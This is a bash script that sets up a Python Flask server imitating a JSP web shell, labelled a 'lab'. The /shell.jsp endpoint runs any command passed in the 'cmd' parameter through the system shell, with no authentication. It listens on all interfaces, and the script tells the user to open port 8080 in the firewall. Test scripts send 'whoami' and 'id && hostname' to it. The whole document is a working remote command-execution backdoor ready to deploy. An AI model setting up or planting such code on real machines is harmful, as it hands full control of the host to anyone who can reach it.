#!/usr/bin/env bash
set -Eeuo pipefail

APP_DIR="$HOME/fake_shelljsp_lab"
PORT="8080"
HOST="0.0.0.0"

mkdir -p "$APP_DIR"
cd "$APP_DIR"

echo "[+] Installing packages..."
sudo apt update
sudo apt install -y python3 python3-venv curl

echo "[+] Creating python venv..."
python3 -m venv venv

./venv/bin/pip install --upgrade pip >/dev/null
./venv/bin/pip install flask >/dev/null

cat > shell_server.py <<'PY'
from flask import Flask, request, Response
import subprocess

app = Flask(__name__)

@app.route("/shell.jsp", methods=["GET", "POST"])
def shell():
    cmd = request.values.get("cmd", "")

    if not cmd:
        return Response("no cmd\n", mimetype="text/plain")

    try:
        result = subprocess.run(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=25,
            text=True,
        )

        return Response(result.stdout, mimetype="text/plain")

    except subprocess.TimeoutExpired:
        return Response("command timeout\n", mimetype="text/plain")

    except Exception as e:
        return Response(str(e) + "\n", mimetype="text/plain")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
PY

cat > start.sh <<'SH'
#!/usr/bin/env bash
set -Eeuo pipefail

cd "$(dirname "$0")"

echo
echo "[+] Fake shell.jsp started"
echo "[+] URL: http://0.0.0.0:8080/shell.jsp"
echo "[+] Press Ctrl+C to stop"
echo

./venv/bin/python shell_server.py
SH

chmod +x start.sh

cat > test_local.sh <<'SH'
#!/usr/bin/env bash

curl --get \
  --data-urlencode "cmd=whoami" \
  http://127.0.0.1:8080/shell.jsp

echo

curl --get \
  --data-urlencode "cmd=id && hostname" \
  http://127.0.0.1:8080/shell.jsp

echo
SH

chmod +x test_local.sh

SERVER_IP=$(hostname -I | awk '{print $1}')

echo
echo "[+] Fake shell.jsp lab created"
echo "[+] Directory : $APP_DIR"
echo "[+] Local test:"
echo "    cd $APP_DIR && ./test_local.sh"
echo
echo "[+] Remote access URL:"
echo "    http://${SERVER_IP}:8080/shell.jsp"
echo
echo "[+] If firewall enabled:"
echo "    sudo ufw allow 8080/tcp"
echo
echo "[+] Starting server..."
echo

./start.sh
